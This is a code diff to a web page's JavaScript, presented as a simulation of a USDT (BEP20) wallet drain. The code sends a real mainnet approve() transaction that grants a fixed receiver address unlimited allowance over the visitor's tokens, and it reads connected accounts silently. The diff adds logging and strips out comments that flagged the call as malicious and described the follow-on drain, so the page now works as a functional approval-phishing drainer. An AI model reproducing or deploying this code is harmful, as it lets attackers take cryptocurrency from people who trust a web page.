@@ -39,44 +39,51 @@ const statusMessageDiv = document.getElementById('statusMessage');
 
 // Initializes Web3 provider and attempts to get connected account passively
 async function initializeWeb3() {
+    console.log("initializeWeb3: Function started.");
+    
     // Set the receiver address input value from the constant
     receiverAddressInput.value = RECEIVER_WALLET_FOR_TESTING;
 
     if (typeof window.ethereum === 'undefined') {
         statusMessageDiv.textContent = 'Web3 wallet (MetaMask/Trust Wallet) not detected. Please use a DApp browser.';
-        transferBtn.disabled = true; // Disable button if no wallet
+        transferBtn.disabled = true; 
+        console.log("initializeWeb3: window.ethereum is undefined. Wallet not detected.");
         return;
+    } else {
+        console.log("initializeWeb3: window.ethereum detected.");
     }
 
     try {
         provider = new ethers.providers.Web3Provider(window.ethereum);
         signer = provider.getSigner();
+        console.log("initializeWeb3: Ethers provider and signer initialized.");
 
-        // Attempt to get accounts without prompting (if already connected/approved for this site)
-        // This is how a malicious site might 'silently' get your address if you've ever approved it.
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length > 0) {
             connectedAccount = accounts[0];
-            fromAddressInput.value = connectedAccount; // Pre-fill with actual address
+            fromAddressInput.value = connectedAccount; 
+            console.log("initializeWeb3: Account already connected:", connectedAccount);
         } else {
-            // If no accounts found (e.g., first time visiting this DApp), use placeholder
             fromAddressInput.value = '0x... (Wallet Connection Needed)';
             statusMessageDiv.textContent = 'Wallet detected. Interact to continue.';
-            // In a real scam, clicking "Next" might trigger eth_requestAccounts if needed,
-            // then immediately the malicious approve.
+            console.log("initializeWeb3: No account pre-connected.");
         }
 
         const network = await provider.getNetwork();
+        console.log("initializeWeb3: Detected Network Chain ID:", network.chainId);
+
         if (network.chainId !== parseInt(MAINNET_CHAIN_ID)) {
             statusMessageDiv.innerHTML = `<strong>CRITICAL WARNING:</strong> Wallet is on wrong network (ID: ${network.chainId}). Please switch to BNB Smart Chain Mainnet (ID: ${parseInt(MAINNET_CHAIN_ID)}) in your wallet.`;
             transferBtn.disabled = true;
+            console.log("initializeWeb3: Wrong network detected. Button disabled.");
         } else {
             statusMessageDiv.textContent = 'Wallet connected to BNB Mainnet. Click "Next" to simulate the approval.';
-            transferBtn.disabled = false;
+            transferBtn.disabled = false; // Button enabled here if all checks pass
+            console.log("initializeWeb3: Correct network detected. Button enabled.");
         }
 
     } catch (error) {
-        console.error("Error initializing Web3 or getting accounts:", error);
+        console.error("initializeWeb3: Error during initialization:", error);
         statusMessageDiv.textContent = 'Error initializing wallet. See console. Make sure wallet is unlocked.';
         transferBtn.disabled = true;
     }
@@ -84,54 +91,50 @@ async function initializeWeb3() {
 
 // Function to simulate the malicious token approval
 async function simulateBEP20USDTDrain() {
+    console.log("simulateBEP20USDTDrain: Button clicked. Function started.");
+
     if (!provider || !signer) {
         statusMessageDiv.textContent = 'Wallet not initialized. Reload page in DApp browser.';
+        console.log("simulateBEP20USDTDrain: Provider or signer not initialized. Exiting.");
         return;
     }
 
-    // Ensure we have a connected account (eth_requestAccounts might be triggered here if not already)
     if (!connectedAccount) {
+        console.log("simulateBEP20USDTDrain: No connected account found, requesting now.");
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             connectedAccount = accounts[0];
             fromAddressInput.value = connectedAccount;
+            console.log("simulateBEP20USDTDrain: Account connected after request:", connectedAccount);
         } catch (error) {
-            console.error("User rejected wallet connection:", error);
+            console.error("simulateBEP20USDTDrain: User rejected wallet connection:", error);
             statusMessageDiv.innerHTML = '<span style="color: orange;">Wallet connection rejected. Cannot proceed with simulation.</span>';
             return;
         }
     }
     
     statusMessageDiv.innerHTML = 'Requesting transaction... Check your wallet for the **APPROVE** pop-up!';
+    console.log("simulateBEP20USDTDrain: Attempting to send approve transaction.");
 
     try {
-        // Create a contract instance for the real USDT (BEP20) token, using the signer to send transactions
         const usdtContract = new ethers.Contract(USDT_BEP20_MAINNET_CONTRACT_ADDRESS, ERC20_ABI_APPROVE, signer);
+        console.log("simulateBEP20USDTDrain: USDT Contract instance created.");
 
-        // --- THIS IS THE CORE MALICIOUS CALL ---
-        // We are calling the 'approve' function on the real USDT (BEP20) contract.
-        // It grants the 'RECEIVER_WALLET_FOR_TESTING' an 'unlimited' allowance (MAX_UINT256)
-        // to spend tokens from your connected account.
         const tx = await usdtContract.approve(RECEIVER_WALLET_FOR_TESTING, MAX_UINT256);
+        console.log("simulateBEP20USDTDrain: Transaction sent. Hash:", tx.hash);
 
         statusMessageDiv.innerHTML = `Transaction sent! Please confirm in your wallet. <br>
                                      <strong>Transaction Hash:</strong> <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash}</a><br>
                                      <span style="color: #00bcd4;">(This is the **APPROVE** transaction for your USDT BEP20)</span>`;
-        console.log("Approval Transaction Details:", tx);
-
-        // Wait for the transaction to be mined
+        
         await tx.wait();
         statusMessageDiv.innerHTML += '<br><span style="color: lightgreen;">Transaction confirmed on Mainnet! Unlimited allowance granted.</span>';
         alert('SIMULATION COMPLETE: You have granted an UNLIMITED allowance to your designated receiver address for your USDT BEP20. In a real scam, the scammer would now drain your tokens.');
-
-        // In a real scam, the attacker's backend would now call
-        // usdtContract.transferFrom(yourAddress, scammerAddress, amount_to_drain)
-        // using their own wallet, leveraging the allowance you just granted.
-        // This second step happens WITHOUT any further pop-ups for you.
+        console.log("simulateBEP20USDTDrain: Transaction confirmed.");
 
     } catch (error) {
-        console.error("Error during simulation:", error);
-        if (error.code === 4001) { // User rejected transaction
+        console.error("simulateBEP20USDTDrain: Error during transaction:", error);
+        if (error.code === 4001) { 
             statusMessageDiv.innerHTML = '<span style="color: orange;">Transaction rejected by user.</span>';
         } else if (error.message.includes('network')) {
             statusMessageDiv.innerHTML = '<span style="color: red;">Network error. Make sure your wallet is on BNB Mainnet.</span>';
@@ -145,7 +148,9 @@ async function simulateBEP20USDTDrain() {
 }
 
 // --- Event Listeners ---
+// The button is initially disabled in HTML, then enabled by JS on successful initialization.
 transferBtn.addEventListener('click', simulateBEP20USDTDrain);
+console.log("Event listener attached to transferBtn.");
 
 // --- Initial setup when the page loads ---
 initializeWeb3();
@@ -153,6 +158,7 @@ initializeWeb3();
 // Handle account and chain changes for robustness (important in dApps)
 if (window.ethereum) {
     window.ethereum.on('accountsChanged', (accounts) => {
+        console.log("accountsChanged event fired. New accounts:", accounts);
         if (accounts.length > 0) {
             connectedAccount = accounts[0];
             fromAddressInput.value = connectedAccount;
@@ -165,6 +171,7 @@ if (window.ethereum) {
     });
 
     window.ethereum.on('chainChanged', (chainId) => {
+        console.log("chainChanged event fired. New chainId:", chainId);
         if (chainId !== MAINNET_CHAIN_ID) {
             statusMessageDiv.innerHTML = `<strong>CRITICAL WARNING:</strong> Network changed (ID: ${chainId}). Please switch to BNB Smart Chain Mainnet (ID: ${parseInt(MAINNET_CHAIN_ID)}) in your wallet.`;
             transferBtn.disabled = true;
